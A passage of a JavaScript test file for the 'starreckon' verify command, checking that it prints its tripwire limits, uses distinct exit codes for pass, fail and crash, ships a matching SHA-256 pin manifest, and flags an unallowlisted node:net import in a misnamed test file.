  // passed"). Pinning the count and the wording both assumed a host with a
  // usable OS sandbox, which this test says nothing about.
  assert.ok(
    /verify: \d+ of 4 check\(s\) passed/.test(text) ||
      /verify: CHECKS FAILED \(\d+ of 4\)/.test(text),
    text.slice(-400)
  );
  assert.ok(text.includes("2 had NOTHING TO INSPECT"), text.slice(-400));
});

// ---- TRIPWIRE_LIMITS must actually reach the user ---------------------------
// Red-team finding: "TRIPWIRE_LIMITS is never printed anywhere, though the
// source twice claims verify prints it."

test("verify prints every TRIPWIRE_LIMITS line verbatim", () => {
  const srcDir = tmp();
  writeAllowlisted(srcDir);
  const text = capture(() => printVerify(runVerify({ root: srcDir, dataDir: tmp() })));
  assert.ok(TRIPWIRE_LIMITS.length >= 5);
  for (const l of TRIPWIRE_LIMITS)
    assert.ok(text.includes(l), `TRIPWIRE_LIMITS line missing from verify output: ${l}`);
});

test("`starreckon verify` prints the tripwire limits too (not just the library)", () => {
  const r = spawnSync(process.execPath, [join(ROOT, "src", "cli.mjs"), "verify"], {
    encoding: "utf8",
    env: { ...process.env, HOME: tmp() },
  });
  const text = r.stdout.replace(/\x1b\[[0-9;]*m/g, "");
  for (const l of TRIPWIRE_LIMITS)
    assert.ok(text.includes(l), `missing from \`starreckon verify\` stdout: ${l}`);
  // The subject is that the limits are PRINTED. verify's exit code is the AND
  // over every check and goes to 1 on any host without a usable OS sandbox, so
  // pinning 0 made this assert something it was not testing. 2 means verify
  // itself crashed, and that WOULD invalidate the output above.
  assert.notStrictEqual(r.status, 2, `verify crashed: ${r.stderr}`);
});

// ---- exit codes: a crashing warden is not a failing check --------------------
// Red-team finding: "`starreckon verify` can never exit 2, so exit 1 is
// ambiguous between 'a check failed' and 'verify crashed'."

test("verifyCli returns 0 / 1 / 2 for pass / fail / crash", () => {
  const codes = [];
  const exit = (c) => codes.push(c);
  const quiet = () => {};

  verifyCli({ run: () => ({ ok: true, checks: [] }), print: quiet, exit });
  verifyCli({ run: () => ({ ok: false, checks: [] }), print: quiet, exit });
  const errs = [];
  const origErr = console.error;
  console.error = (...a) => errs.push(a.join(" "));
  try {
    verifyCli({
      run: () => {
        throw new Error("simulated internal crash");
      },
      print: quiet,
      exit,
    });
  } finally {
    console.error = origErr;
  }
  assert.deepStrictEqual(codes, [0, 1, 2]);
  const said = errs.join("\n");
  assert.ok(said.includes("verify crashed"), said);
  assert.ok(said.includes("simulated internal crash"), said);
  assert.ok(said.includes("not a pass") || said.includes("NOT a failed check"), said);
});

test("`starreckon verify` itself exits 2 when runVerify throws (not 1, not a stack dump)", () => {
  // A real copy of the tree with a crash injected — the documented invocation,
  // end to end, because that is the one the exit-code contract is written for.
  const dir = tmp();
  cpSync(join(ROOT, "src"), join(dir, "src"), { recursive: true });
  const vpath = join(dir, "src", "verify.mjs");
  const patched = readFileSync(vpath, "utf8").replace(
    "export function runVerify(opts = {}) {",
    'export function runVerify(opts = {}) {\n  throw new Error("simulated internal crash");'
  );
  assert.ok(patched.includes("simulated internal crash"), "crash injection point moved");
  writeFileSync(vpath, patched);

  const viaCli = spawnSync(process.execPath, [join(dir, "src", "cli.mjs"), "verify"], { encoding: "utf8" });
  assert.strictEqual(viaCli.status, 2, `cli: ${viaCli.stdout}${viaCli.stderr}`);
  assert.ok(viaCli.stderr.includes("verify crashed"), viaCli.stderr);

  const viaModule = spawnSync(process.execPath, [vpath], { encoding: "utf8" });
  assert.strictEqual(viaModule.status, 2, `module: ${viaModule.stdout}${viaModule.stderr}`);
});

test("`starreckon verify` and `node src/verify.mjs` agree on the exit code", () => {
  const env = { ...process.env, HOME: tmp() };
  const a = spawnSync(process.execPath, [join(ROOT, "src", "cli.mjs"), "verify"], { encoding: "utf8", env });
  const b = spawnSync(process.execPath, [join(ROOT, "src", "verify.mjs")], { encoding: "utf8", env });
  assert.strictEqual(a.status, b.status, "the two documented invocations must not disagree");
  // Agreement is the subject; the VALUE is the host's business. Whether verify
  // exits 0 or 1 depends on whether this machine has a usable OS sandbox, and
  // both invocations must reach the same answer either way. 2 would mean it
  // crashed, which is not agreement about anything.
  assert.notStrictEqual(a.status, 2, a.stdout.slice(-2000) + a.stderr);
});

// ---- the pin manifest ships and is regenerable ------------------------------

test("updatePins writes a manifest that pins exactly the allowlisted files", () => {
  const dir = tmp();
  writeAllowlisted(dir, { pins: false });
  const { path, files } = updatePins(dir);
  assert.deepStrictEqual(Object.keys(files).sort(), Object.keys(STATIC_ALLOWLIST).sort());
  const manifest = JSON.parse(readFileSync(path, "utf8"));
  assert.strictEqual(manifest.algorithm, "sha256");
  assert.ok(manifest.note.includes("--update-pins"), "the manifest must say how it is regenerated");
  for (const [name, hash] of Object.entries(files))
    assert.strictEqual(hash, sha256(readFileSync(join(dir, name))));
});

test("the real tree ships a pin manifest that matches the real allowlisted files", () => {
  const manifest = JSON.parse(readFileSync(join(SRC_DIR, PINS_BASENAME), "utf8"));
  for (const name of Object.keys(STATIC_ALLOWLIST))
    assert.strictEqual(
      manifest.files[name],
      sha256(readFileSync(join(SRC_DIR, name))),
      `${name} changed without re-pinning — run: node src/verify.mjs --update-pins`
    );
});

test("naming a src file *.test.mjs is not a way out of the rules", () => {
  const dir = tmp();
  mkdirSync(join(dir, "src"), { recursive: true });
  writeAllowlisted(join(dir, "src"), { pkg: null });
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "x", files: ["src/"] }));
  writeFileSync(
    join(dir, "src", "helper.test.mjs"),
    'import net from "node:net";\nexport const s = net;\n'
  );
  const res = staticScan(dir);
  assert.strictEqual(res.pass, false, "test-file leniency is scoped to tests/, not to a filename");
  assert.ok(
    res.findings.some((f) => f.includes("src/helper.test.mjs:1") && f.includes("not on the allowlist")),
    JSON.stringify(res.findings)
  );
});

test("the test-file limit states the consequence, not just the policy", () => {
  const limits = staticScan(ROOT).limits.join("\n");
  assert.ok(limits.includes("enumerated, NOT judged"), limits);
  assert.ok(
    limits.includes("WOULD still pass"),
    "the limit must say what gets through, not only what is caught"
  );
});
